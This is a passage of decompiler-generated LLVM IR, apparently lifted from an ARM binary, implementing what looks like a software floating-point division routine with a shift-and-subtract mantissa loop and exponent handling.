  %v4_194c4 = mul i32 %arg4, 4096
  %v5_194c4 = or i32 %v4_194c4, %arg3
  store i32 %v5_194c4, i32* %r5.global-to-local, align 4
  %v7_194c4 = icmp eq i32 %v5_194c4, 0
  %v3_194c8 = mul i32 %v1_194a8, 4096
  store i32 %v3_194c8, i32* %r1.global-to-local, align 4
  br i1 %v7_194c4, label %dec_label_pc_19604, label %dec_label_pc_194d0

dec_label_pc_194d0:                               ; preds = %dec_label_pc_194bc
  %tmp92 = mul i32 %arg4, 256
  %v4_194d8 = and i32 %tmp92, 268435200
  %v4_194dc = udiv i32 %arg3, 16777216
  %v5_194d8 = or i32 %v4_194dc, %v4_194d8
  %v5_194dc = or i32 %v5_194d8, 268435456
  store i32 %v5_194dc, i32* %r3.global-to-local, align 4
  %v3_194e0 = mul i32 %arg3, 256
  store i32 %v3_194e0, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_194a8, 256
  %v4_194e4 = and i32 %tmp93, 268435200
  %v1_194e8 = load i32, i32* @r0, align 4
  %v4_194e8 = udiv i32 %v1_194e8, 16777216
  %v5_194e4 = or i32 %v4_194e4, %v4_194e8
  %v5_194e8 = or i32 %v5_194e4, 268435456
  store i32 %v5_194e8, i32* %r5.global-to-local, align 4
  %v3_194ec = mul i32 %v1_194e8, 256
  store i32 %v3_194ec, i32* %r6.global-to-local, align 4
  %v1_194f0 = and i32 %v2_194c0, -2147483648
  store i32 %v1_194f0, i32* %r1.global-to-local, align 4
  %v3_194f4 = icmp uge i32 %v5_194e8, %v5_194dc
  %v9_194f4 = icmp eq i32 %v5_194e8, %v5_194dc
  br i1 %v9_194f4, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_194d0
  %v4_194f8 = icmp uge i32 %v3_194ec, %v3_194e0
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_194d0, %bb94
  %v1_194fc = phi i1 [ %v3_194f4, %dec_label_pc_194d0 ], [ %v4_194f8, %bb94 ]
  %v2_194fc = add nsw i32 %v2_194bc, 253
  %v3_194fc = zext i1 %v1_194fc to i32
  %v4_194fc = add nsw i32 %v2_194fc, %v3_194fc
  %v8_194fc = icmp ule i32 %v4_194fc, %v2_194bc
  %v9_194fc = icmp ugt i32 %v2_194bc, -254
  %v10_194fc = select i1 %v1_194fc, i1 %v8_194fc, i1 %v9_194fc
  %v1_19500 = add nsw i32 %v4_194fc, 768
  store i32 %v1_19500, i32* %r4.global-to-local, align 4
  br i1 %v10_194fc, label %dec_label_pc_19510, label %dec_label_pc_19508

dec_label_pc_19508:                               ; preds = %bb95
  %v3_19508 = udiv i32 %v5_194dc, 2
  store i32 %v3_19508, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19510

dec_label_pc_19510:                               ; preds = %bb95, %dec_label_pc_19508
  %v0_19518 = phi i32 [ %v5_194dc, %bb95 ], [ %v3_19508, %dec_label_pc_19508 ]
  %v0_1951c = phi i32 [ %v3_194e0, %bb95 ], [ 0, %dec_label_pc_19508 ]
  %v2_19510 = sub i32 %v3_194ec, %v0_1951c
  store i32 %v2_19510, i32* %r6.global-to-local, align 4
  %v3_19510 = icmp uge i32 %v3_194ec, %v0_1951c
  %v3_19514 = icmp eq i1 %v3_19510, false
  %v4_19514 = sub nsw i32 %v5_194e8, %v0_19518
  %v6_19514 = sext i1 %v3_19514 to i32
  %v7_19514 = add nsw i32 %v6_19514, %v4_19514
  store i32 %v7_19514, i32* %r5.global-to-local, align 4
  %v3_19518 = udiv i32 %v0_19518, 2
  store i32 %v3_19518, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19528.outer

dec_label_pc_19528.outer:                         ; preds = %dec_label_pc_195c0, %dec_label_pc_19510
  %v1_195d4.ph = phi i32 [ %v2_195c0, %dec_label_pc_195c0 ], [ %v1_194f0, %dec_label_pc_19510 ]
  %v0_1952c.ph = phi i32 [ %v5_1959c, %dec_label_pc_195c0 ], [ %v7_19514, %dec_label_pc_19510 ]
  %v1_19530.ph = phi i32 [ %v3_195a0, %dec_label_pc_195c0 ], [ %v2_19510, %dec_label_pc_19510 ]
  %v5_195a817.ph = phi i32 [ %v5_195a8, %dec_label_pc_195c0 ], [ %v3_19518, %dec_label_pc_19510 ]
  %v3_195ac13.ph = phi i32 [ %v3_195ac, %dec_label_pc_195c0 ], [ 0, %dec_label_pc_19510 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_195c0 ], [ 1048576, %dec_label_pc_19510 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_195c0 ], [ 524288, %dec_label_pc_19510 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_19528

dec_label_pc_19528:                               ; preds = %dec_label_pc_19528.outer, %dec_label_pc_19598
  %v1_1958c59 = phi i32 [ %v2_195d4, %dec_label_pc_19598 ], [ %storemerge133, %dec_label_pc_19528.outer ]
  %v1_19538 = phi i32 [ %v1_1953832, %dec_label_pc_19598 ], [ %storemerge133, %dec_label_pc_19528.outer ]
  %v1_1955441 = phi i32 [ %v1_1955443, %dec_label_pc_19598 ], [ %storemerge133, %dec_label_pc_19528.outer ]
  %v1_1957050 = phi i32 [ %v1_1957052, %dec_label_pc_19598 ], [ %storemerge133, %dec_label_pc_19528.outer ]
  %v0_195b0 = phi i32 [ %v3_195b0, %dec_label_pc_19598 ], [ %storemerge, %dec_label_pc_19528.outer ]
  %v0_1952c = phi i32 [ %v5_1959c, %dec_label_pc_19598 ], [ %v0_1952c.ph, %dec_label_pc_19528.outer ]
  %v1_19530 = phi i32 [ %v3_195a0, %dec_label_pc_19598 ], [ %v1_19530.ph, %dec_label_pc_19528.outer ]
  %v5_195a817 = phi i32 [ %v5_195a8, %dec_label_pc_19598 ], [ %v5_195a817.ph, %dec_label_pc_19528.outer ]
  %v3_195ac13 = phi i32 [ %v3_195ac, %dec_label_pc_19598 ], [ %v3_195ac13.ph, %dec_label_pc_19528.outer ]
  %v3_19528 = icmp uge i32 %v1_19530, %v3_195ac13
  %v3_1952c = icmp eq i1 %v3_19528, false
  %v4_1952c = sub i32 %v0_1952c, %v5_195a817
  %v6_1952c = sext i1 %v3_1952c to i32
  %v7_1952c = add i32 %v6_1952c, %v4_1952c
  %v8_1952c = zext i1 %v3_1952c to i32
  %v9_1952c = sub i32 %v7_1952c, %v8_1952c
  %v10_1952c = icmp ult i32 %v0_1952c, %v9_1952c
  %v11_1952c = icmp ne i32 %v5_195a817, -1
  %v12_1952c = or i1 %v11_1952c, %v10_1952c
  %v13_1952c = icmp ult i32 %v0_1952c, %v5_195a817
  %v14_1952c = select i1 %v3_1952c, i1 %v12_1952c, i1 %v13_1952c
  br i1 %v14_1952c, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_19528
  %v3_19530 = sub i32 %v1_19530, %v3_195ac13
  store i32 %v3_19530, i32* %r6.global-to-local, align 4
  store i32 %v7_1952c, i32* %r5.global-to-local, align 4
  %v3_19538 = or i32 %v1_19538, %v0_195b0
  store i32 %v3_19538, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_19528, %bb96
  %v1_1958c58 = phi i32 [ %v1_1958c59, %dec_label_pc_19528 ], [ %v3_19538, %bb96 ]
  %v1_1953835 = phi i32 [ %v1_19538, %dec_label_pc_19528 ], [ %v3_19538, %bb96 ]
  %v1_19554 = phi i32 [ %v1_1955441, %dec_label_pc_19528 ], [ %v3_19538, %bb96 ]
  %v1_1957049 = phi i32 [ %v1_1957050, %dec_label_pc_19528 ], [ %v3_19538, %bb96 ]
  %v0_19548 = phi i32 [ %v0_1952c, %dec_label_pc_19528 ], [ %v7_1952c, %bb96 ]
  %v1_1954c = phi i32 [ %v1_19530, %dec_label_pc_19528 ], [ %v3_19530, %bb96 ]
  %v1_1953c = urem i32 %v5_195a817, 2
  %v2_1953c = icmp ne i32 %v1_1953c, 0
  %v3_1953c = udiv i32 %v5_195a817, 2
  %v3_19540 = zext i1 %v2_1953c to i32
  %v6_19540 = zext i32 %v3_195ac13 to i64
  %v7_19540 = sub i32 33, %v3_195ac13
  %v8_19540 = zext i32 %v7_19540 to i64
  %v9_19540 = shl i64 %v6_19540, %v8_19540
  %v10_19540 = sub i32 32, %v3_195ac13
  %v11_19540 = shl i32 %v3_19540, %v10_19540
  %v12_19540 = zext i32 %v11_19540 to i64
  %v14_19540 = or i64 %v12_19540, %v9_19540
  %v15_19540 = trunc i64 %v14_19540 to i32
  %v3_19544 = icmp uge i32 %v1_1954c, %v15_19540
  %v3_19548 = icmp eq i1 %v3_19544, false
  %v4_19548 = sub i32 %v0_19548, %v3_1953c
  %v6_19548 = sext i1 %v3_19548 to i32
  %v7_19548 = add i32 %v6_19548, %v4_19548
  %v13_19548 = icmp ult i32 %v0_19548, %v3_1953c
  %v14_19548 = or i1 %v13_19548, %v3_19548
  br i1 %v14_19548, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1954c = sub i32 %v1_1954c, %v15_19540
  store i32 %v3_1954c, i32* %r6.global-to-local, align 4
  store i32 %v7_19548, i32* %r5.global-to-local, align 4
  %v5_19554 = udiv i32 %v0_195b0, 2
  %v6_19554 = or i32 %v1_19554, %v5_19554
  store i32 %v6_19554, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1958c57 = phi i32 [ %v1_1958c58, %.thread4 ], [ %v6_19554, %bb97 ]
  %v1_1953834 = phi i32 [ %v1_1953835, %.thread4 ], [ %v6_19554, %bb97 ]
  %v1_1955445 = phi i32 [ %v1_19554, %.thread4 ], [ %v6_19554, %bb97 ]
  %v1_19570 = phi i32 [ %v1_1957049, %.thread4 ], [ %v6_19554, %bb97 ]
  %v0_19564 = phi i32 [ %v0_19548, %.thread4 ], [ %v7_19548, %bb97 ]
  %v1_19568 = phi i32 [ %v1_1954c, %.thread4 ], [ %v3_1954c, %bb97 ]
  %v1_19558 = urem i32 %v3_1953c, 2
  %v2_19558 = icmp ne i32 %v1_19558, 0
  %v3_19558 = udiv i32 %v5_195a817, 4
  %v3_1955c = zext i1 %v2_19558 to i32
  %v6_1955c = and i64 %v14_19540, 4294967295
  %v7_1955c = sub i32 33, %v15_19540
  %v8_1955c = zext i32 %v7_1955c to i64
  %v9_1955c = shl i64 %v6_1955c, %v8_1955c
  %v10_1955c = sub i32 32, %v15_19540
  %v11_1955c = shl i32 %v3_1955c, %v10_1955c
  %v12_1955c = zext i32 %v11_1955c to i64
  %v14_1955c = or i64 %v12_1955c, %v9_1955c
  %v15_1955c = trunc i64 %v14_1955c to i32
  %v3_19560 = icmp uge i32 %v1_19568, %v15_1955c
  %v3_19564 = icmp eq i1 %v3_19560, false
  %v4_19564 = sub i32 %v0_19564, %v3_19558
  %v6_19564 = sext i1 %v3_19564 to i32
  %v7_19564 = add i32 %v6_19564, %v4_19564
  %v13_19564 = icmp ult i32 %v0_19564, %v3_19558
  %v14_19564 = or i1 %v13_19564, %v3_19564
  br i1 %v14_19564, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_19568 = sub i32 %v1_19568, %v15_1955c
  store i32 %v3_19568, i32* %r6.global-to-local, align 4
  store i32 %v7_19564, i32* %r5.global-to-local, align 4
  %v5_19570 = udiv i32 %v0_195b0, 4
  %v6_19570 = or i32 %v1_19570, %v5_19570
  store i32 %v6_19570, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1958c = phi i32 [ %v1_1958c57, %.thread6 ], [ %v6_19570, %bb98 ]
  %v1_1953833 = phi i32 [ %v1_1953834, %.thread6 ], [ %v6_19570, %bb98 ]
  %v1_1955444 = phi i32 [ %v1_1955445, %.thread6 ], [ %v6_19570, %bb98 ]
  %v1_1957053 = phi i32 [ %v1_19570, %.thread6 ], [ %v6_19570, %bb98 ]
  %v0_19580 = phi i32 [ %v0_19564, %.thread6 ], [ %v7_19564, %bb98 ]
  %v1_19584 = phi i32 [ %v1_19568, %.thread6 ], [ %v3_19568, %bb98 ]
  %v1_19574 = urem i32 %v3_19558, 2
  %v2_19574 = icmp ne i32 %v1_19574, 0
  %v3_19574 = udiv i32 %v5_195a817, 8
  %v3_19578 = zext i1 %v2_19574 to i32
  %v6_19578 = and i64 %v14_1955c, 4294967295
  %v7_19578 = sub i32 33, %v15_1955c
  %v8_19578 = zext i32 %v7_19578 to i64
  %v9_19578 = shl i64 %v6_19578, %v8_19578
  %v10_19578 = sub i32 32, %v15_1955c
  %v11_19578 = shl i32 %v3_19578, %v10_19578
  %v12_19578 = zext i32 %v11_19578 to i64
  %v14_19578 = or i64 %v12_19578, %v9_19578
  %v15_19578 = trunc i64 %v14_19578 to i32
  %v3_1957c = icmp uge i32 %v1_19584, %v15_19578
  %v3_19580 = icmp eq i1 %v3_1957c, false
  %v4_19580 = sub i32 %v0_19580, %v3_19574
  %v6_19580 = sext i1 %v3_19580 to i32
  %v7_19580 = add i32 %v6_19580, %v4_19580
  %v13_19580 = icmp ult i32 %v0_19580, %v3_19574
  %v14_19580 = or i1 %v13_19580, %v3_19580
  br i1 %v14_19580, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_19584 = sub i32 %v1_19584, %v15_19578
  store i32 %v3_19584, i32* %r6.global-to-local, align 4
  store i32 %v7_19580, i32* %r5.global-to-local, align 4
  %v5_1958c = udiv i32 %v0_195b0, 8
  %v6_1958c = or i32 %v1_1958c, %v5_1958c
  store i32 %v6_1958c, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1959c = phi i32 [ %v1_19584, %.thread8 ], [ %v3_19584, %bb100 ]
  %v0_19598 = phi i32 [ %v0_19580, %.thread8 ], [ %v7_19580, %bb100 ]
  %v2_195d4 = phi i32 [ %v1_1958c, %.thread8 ], [ %v6_1958c, %bb100 ]
  %v1_1953832 = phi i32 [ %v1_1953833, %.thread8 ], [ %v6_1958c, %bb100 ]
  %v1_1955443 = phi i32 [ %v1_1955444, %.thread8 ], [ %v6_1958c, %bb100 ]
  %v1_1957052 = phi i32 [ %v1_1957053, %.thread8 ], [ %v6_1958c, %bb100 ]
  %v2_19590 = or i32 %v0_19598, %v1_1959c
  %v4_19590 = icmp eq i32 %v2_19590, 0
  br i1 %v4_19590, label %dec_label_pc_195d0, label %dec_label_pc_19598

dec_label_pc_19598:                               ; preds = %.thread10
  %v3_19598 = mul i32 %v0_19598, 16
  %v4_1959c = udiv i32 %v1_1959c, 268435456
  %v5_1959c = or i32 %v3_19598, %v4_1959c
  store i32 %v5_1959c, i32* %r5.global-to-local, align 4
  %v3_195a0 = mul i32 %v1_1959c, 16
  store i32 %v3_195a0, i32* %r6.global-to-local, align 4
  %v3_195a4 = mul nuw i32 %v3_19574, 8
  %v4_195a8 = udiv i32 %v15_19578, 536870912
  %v5_195a8 = or i32 %v4_195a8, %v3_195a4
  %v3_195ac = mul i32 %v15_19578, 8
  %v3_195b0 = udiv i32 %v0_195b0, 16
  store i32 %v3_195b0, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_195b0, 16
  br i1 %tmp, label %dec_label_pc_195b8, label %dec_label_pc_19528

dec_label_pc_195b8:                               ; preds = %dec_label_pc_19598
  %v1_195b8 = and i32 %v1_195d4.ph, 1048576
  %v2_195b8 = icmp eq i32 %v1_195b8, 0
  br i1 %v2_195b8, label %dec_label_pc_195c0, label %.thread11.loopexit

dec_label_pc_195c0:                               ; preds = %dec_label_pc_195b8
  %v2_195c0 = or i32 %v2_195d4, %v1_195d4.ph
  store i32 %v2_195c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19528.outer

dec_label_pc_195d0:                               ; preds = %.thread10
  store i32 %v15_19578, i32* %r2.global-to-local, align 4
  store i32 %v3_19574, i32* %r3.global-to-local, align 4
  %v1_195d0 = and i32 %v1_195d4.ph, 1048576
  %v2_195d0 = icmp eq i32 %v1_195d0, 0
  br i1 %v2_195d0, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_195d0
  %v3_195d4 = or i32 %v2_195d4, %v1_195d4.ph
  store i32 %v3_195d4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_195b8
  store i32 %v3_195ac, i32* %r2.global-to-local, align 4
  store i32 %v5_195a8, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_195d0, %bb101
  %v1_195dc = add nsw i32 %v4_194fc, 515
  store i32 %v1_195dc, i32* %ip.global-to-local, align 4
  %v2_195dc = icmp ugt i32 %v1_19500, 252
  %v7_195dc = icmp eq i32 %v1_19500, 253
  %v2_195e0 = xor i1 %v7_195dc, true
  %v3_195e0 = and i1 %v2_195dc, %v2_195e0
  br i1 %v3_195e0, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_195e0 = icmp ugt i32 %v1_195dc, 1791
  %v11_195e0 = icmp eq i32 %v1_195dc, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_195e4 = phi i1 [ %v7_195dc, %.thread11 ], [ %v11_195e0, %bb102 ]
  %v0_195e4 = phi i1 [ %v2_195dc, %.thread11 ], [ %v6_195e0, %bb102 ]
  %v2_195e4 = xor i1 %v1_195e4, true
  %v3_195e4 = and i1 %v0_195e4, %v2_195e4
  call void @__pseudo_cond_branch(i1 %v3_195e4, i32 ptrtoint (i32* @global_var_192f8.547 to i32))
  %v0_195e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_195e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_195e8 = sub i32 %v0_195e8, %v1_195e8
  store i32 %v2_195e8, i32* @ip, align 4
  %v3_195e8 = icmp uge i32 %v0_195e8, %v1_195e8
  %v9_195e8 = icmp eq i32 %v0_195e8, %v1_195e8
  br i1 %v9_195e8, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_195ec = load i32, i32* %r6.global-to-local, align 4
  %v2_195ec = load i32, i32* %r2.global-to-local, align 4
  %v3_195ec = sub i32 %v1_195ec, %v2_195ec
  store i32 %v3_195ec, i32* @ip, align 4
  %v4_195ec = icmp uge i32 %v1_195ec, %v2_195ec
  %v10_195ec = icmp eq i32 %v1_195ec, %v2_195ec
  br i1 %v10_195ec, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_195f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_195f0 = urem i32 %v1_195f0, 2
  %v3_195f0 = icmp ne i32 %v2_195f0, 0
  %v4_195f0 = udiv i32 %v1_195f0, 2
  store i32 %v4_195f0, i32* @ip, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_195f4 = phi i1 [ %v3_195e8, %bb103 ], [ %v4_195ec, %bb104 ], [ %v3_195f0, %bb105 ]
  %v0_195f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_195f4 = zext i1 %v1_195f4 to i32
  %v3_195f4 = add i32 %v2_195f4, %v0_195f4
  store i32 %v3_195f4, i32* %r0.global-to-local, align 4
  %v0_195f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_195f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_195f8 = and i32 %v1_195f8, 4096
  %v3_195f8 = icmp ne i32 %v2_195f8, 0
  %v4_195f8 = mul i32 %v1_195f8, 1048576
  %v6_195f8 = add i32 %v4_195f8, %v0_195f8
  %v7_195f8 = zext i1 %v3_195f8 to i32
  %v8_195f8 = add i32 %v7_195f8, %v6_195f8
  store i32 %v8_195f8, i32* @r1, align 4
  %v2_195fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_195fc, i32* @r4, align 4
  store i32 %v6_1949c, i32* @r5, align 4
  store i32 %v9_1949c, i32* @r6, align 4
  store i32 %v12_1949c, i32* @lr, align 4
  ret i32 %v3_195f4

dec_label_pc_19604:                               ; preds = %dec_label_pc_194bc
  %v1_19604 = and i32 %v2_194c0, -2147483648
  %v4_19608 = urem i32 %v1_194a8, 1048576
  %v5_19608 = or i32 %v1_19604, %v4_19608
  store i32 %v5_19608, i32* %r1.global-to-local, align 4
  %v6_1960c = add nsw i32 %v2_194bc, 1023
  store i32 %v6_1960c, i32* %r4.global-to-local, align 4
  %v8_1960c = sub nsw i32 0, %v2_194bc
  %v9_1960c = and i32 %v6_1960c, %v8_1960c
  %v11_1960c = icmp slt i32 %v2_194bc, -1023
  %v12_1960c = icmp eq i32 %v6_1960c, 0
  %v7_19610 = icmp sgt i32 %v2_194bc, -1023
  br i1 %v7_19610, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_19604
  %v10_19610 = sub nsw i32 1024, %v2_194bc
  store i32 %v10_19610, i32* %r5.global-to-local, align 4
  %v14_19610 = and i32 %v10_19610, %v6_1960c
  %v16_19610 = icmp slt i32 %v10_19610, 0
  %v17_19610 = icmp eq i32 %v6_1960c, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_19604, %bb106
  %v3_1961c.in = phi i32 [ %v9_1960c, %dec_label_pc_19604 ], [ %v14_19610, %bb106 ]
  %v2_1961c = phi i1 [ %v11_1960c, %dec_label_pc_19604 ], [ %v16_19610, %bb106 ]
  %v1_1961c = phi i1 [ %v12_1960c, %dec_label_pc_19604 ], [ %v17_19610, %bb106 ]
  %v3_1961c = icmp slt i32 %v3_1961c.in, 0
  %v3_19614 = xor i1 %v3_1961c, %v2_1961c
  %v4_19614 = or i1 %v1_1961c, %v3_19614
  br i1 %v4_19614, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1961484 = mul i32 %v6_1960c, 1048576
  %v10_1961485 = or i32 %v9_1961484, %v5_19608
  store i32 %v10_1961485, i32* %r1.global-to-local, align 4
  store i32 %v3_1949c, i32* %r4.global-to-local, align 4
  store i32 %v6_1949c, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1961c = phi i32 [ %v12_1949c, %bb108 ], [ %v1_19604, %bb107 ]
  %v6_1961c = xor i1 %v4_19614, true
  call void @__pseudo_cond_branch(i1 %v6_1961c, i32 %v0_1961c)
  %v0_19620 = load i32, i32* %r1.global-to-local, align 4
  %v1_19620 = or i32 %v0_19620, 1048576
  store i32 %v1_19620, i32* @r1, align 4
  %v0_19628 = load i32, i32* %r4.global-to-local, align 4
  %v1_19628 = add i32 %v0_19628, -1
  store i32 %v1_19628, i32* @r4, align 4
  %v3_19628 = sub i32 0, %v0_19628
  %v4_19628 = and i32 %v0_19628, %v3_19628
  %v5_19628 = icmp slt i32 %v4_19628, 0
  store i1 %v5_19628, i1* @cpsr_v, align 1
  %v6_19628 = icmp slt i32 %v1_19628, 0
  store i1 %v6_19628, i1* @cpsr_n, align 1
  %v7_19628 = icmp eq i32 %v0_19628, 1
  store i1 %v7_19628, i1* @cpsr_z, align 1
  %v0_1962c = call i32 @function_192f8()
  store i32 %v0_1962c, i32* @r0, align 4
  %v0_19634 = call i32 @function_192f8()
  store i32 %v0_19634, i32* @r0, align 4
  %v0_19638.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1963c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19638

dec_label_pc_19638:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_19638.pre-phi = phi i32 [ %v5_194ac, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_194ac, %bb91 ], [ %v5_194ac, %.thread ]
  %v0_1963c = phi i32 [ %v5_194a8, %.thread1 ], [ %v5_194a8, %.thread2 ], [ %v5_194a8, %bb91 ], [ %v0_1963c.pre, %.thread ]
  %v2_19640 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_19638.pre, %.thread ]
  %v5_19638 = and i32 %v2_19640, %v4_19638.pre-phi
  store i32 %v5_19638, i32* @r5, align 4
  %v4_1963c = icmp eq i32 %v2_19640, %v0_1963c
  br i1 %v4_1963c, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_19638
  %v5_19640 = icmp eq i32 %v5_19638, %v2_19640
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_19638, %bb109
  %v0_19644 = phi i1 [ false, %dec_label_pc_19638 ], [ %v5_19640, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_19644, i32 ptrtoint (i32* @global_var_1948c.549 to i32))
  %v0_19648 = load i32, i32* @r4, align 4
  %v1_19648 = load i32, i32* %ip.global-to-local, align 4
  %v4_19648 = icmp eq i32 %v1_19648, %v0_19648
  br i1 %v4_19648, label %dec_label_pc_19650, label %dec_label_pc_1966c

dec_label_pc_19650:                               ; preds = %bb110
  %v0_19650 = load i32, i32* @r0, align 4
  %v1_19650 = load i32, i32* @r1, align 4
  %v4_19650 = mul i32 %v1_19650, 4096
  %v5_19650 = or i32 %v4_19650, %v0_19650
  store i32 %v5_19650, i32* %r4.global-to-local, align 4
  %v1_19654 = icmp ne i32 %v5_19650, 0
  call void @__pseudo_cond_branch(i1 %v1_19654, i32 ptrtoint (i32* @global_var_1948c.549 to i32))
  %v0_19658 = load i32, i32* @r5, align 4
  %v1_19658 = load i32, i32* %ip.global-to-local, align 4
  %v1_1965c = icmp ne i32 %v1_19658, %v0_19658
  call void @__pseudo_cond_branch(i1 %v1_1965c, i32 ptrtoint (i32* @global_var_19470.550 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_19668 = call i32 @function_1948c(i32 %arg3, i32 %arg4)
  store i32 %v2_19668, i32* @r0, align 4
  %v1_1966c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1966c

dec_label_pc_1966c:                               ; preds = %bb110, %dec_label_pc_19650
  %v1_1966c = phi i32 [ %v1_19648, %bb110 ], [ %v1_1966c.pre, %dec_label_pc_19650 ]
  %v0_1966c = load i32, i32* @r5, align 4
  %v4_1966c = icmp eq i32 %v0_1966c, %v1_1966c
  br i1 %v4_1966c, label %dec_label_pc_19674, label %dec_label_pc_1966c.dec_label_pc_19688_crit_edge

dec_label_pc_1966c.dec_label_pc_19688_crit_edge:  ; preds = %dec_label_pc_1966c
  %v0_19688.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_19688

dec_label_pc_19674:                               ; preds = %dec_label_pc_1966c
  %v4_19674 = mul i32 %arg4, 4096
  %v5_19674 = or i32 %v4_19674, %arg3
  store i32 %v5_19674, i32* %r5.global-to-local, align 4
  %v7_19674 = icmp eq i32 %v5_19674, 0
  call void @__pseudo_cond_branch(i1 %v7_19674, i32 ptrtoint (i32* @global_var_19420.551 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_19684 = call i32 @function_1948c(i32 %arg3, i32 %arg4)
  store i32 %v2_19684, i32* @r0, align 4
  br label %dec_label_pc_19688

dec_label_pc_19688:                               ; preds = %dec_label_pc_1966c.dec_label_pc_19688_crit_edge, %dec_label_pc_19674
  %v0_19688 = phi i32 [ %v0_19688.pre, %dec_label_pc_1966c.dec_label_pc_19688_crit_edge ], [ %v2_19684, %dec_label_pc_19674 ]
  %v1_19688 = load i32, i32* @r1, align 4
  %v3_19688 = mul i32 %v1_19688, 2
  %v4_19688 = or i32 %v3_19688, %v0_19688
  store i32 %v4_19688, i32* %r6.global-to-local, align 4
  %v6_19688 = icmp eq i32 %v4_19688, 0
  br i1 %v6_19688, label %dec_label_pc_19688._crit_edge, label %bb111

dec_label_pc_19688._crit_edge:                    ; preds = %dec_label_pc_19688
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_19688
  %v4_1968c = mul i32 %arg4, 2
  %v5_1968c = or i32 %v4_1968c, %arg3
  store i32 %v5_1968c, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1968c, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_19688._crit_edge, %bb111
  %v4_1969c.pre-phi = phi i32 [ %.pre80, %dec_label_pc_19688._crit_edge ], [ %v5_1968c, %bb111 ]
  %v0_19690 = phi i1 [ false, %dec_label_pc_19688._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_19690, i32 ptrtoint (i32* @global_var_193b8.552 to i32))
  %v0_19694 = load i32, i32* @r0, align 4
  %v1_19694 = load i32, i32* @r1, align 4
  %v3_19694 = mul i32 %v1_19694, 2
  %v4_19694 = or i32 %v3_19694, %v0_19694
  store i32 %v4_19694, i32* %r4.global-to-local, align 4
  %v1_19698 = icmp ne i32 %v4_19694, 0
  call void @__pseudo_cond_branch(i1 %v1_19698, i32 ptrtoint (i32* @global_var_19470.550 to i32))
  store i32 %v4_1969c.pre-phi, i32* %r5.global-to-local, align 4
  %v1_196a0 = icmp ne i32 %v4_1969c.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_196a0, i32 ptrtoint (i32* @global_var_19420.551 to i32))
  %v0_196a4 = load i32, i32* @r0, align 4
  %v1_196a4 = load i32, i32* @r1, align 4
  %v2_196a4 = call i32 @function_1948c(i32 %v0_196a4, i32 %v1_196a4)
  store i32 %v2_196a4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v1_196ac = call i32 @function_196bc(i32 %v2_196a4)
  store i32 %v1_196ac, i32* %r0.global-to-local, align 4
  store i32 1, i32* @ip, align 4
